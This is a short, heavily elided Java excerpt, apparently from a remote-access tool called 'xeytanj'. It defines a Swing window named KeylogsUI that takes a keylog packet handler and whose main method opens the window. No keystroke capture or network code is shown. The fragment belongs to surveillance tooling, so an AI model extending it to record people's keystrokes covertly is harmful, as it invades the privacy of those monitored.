...
import com.melardev.xeytanj.services.net.transport.p2p.handlers.KeylogPacketHandler;
...
public class KeylogsUI extends JFrame {
    ...
    public KeylogsUI(KeylogPacketHandler _serverHandler) {
    ...
    public static void main(String[] args) {
        KeylogsUI ui = new KeylogsUI(null);
        ui.pack();
        ui.setVisible(true);
    }
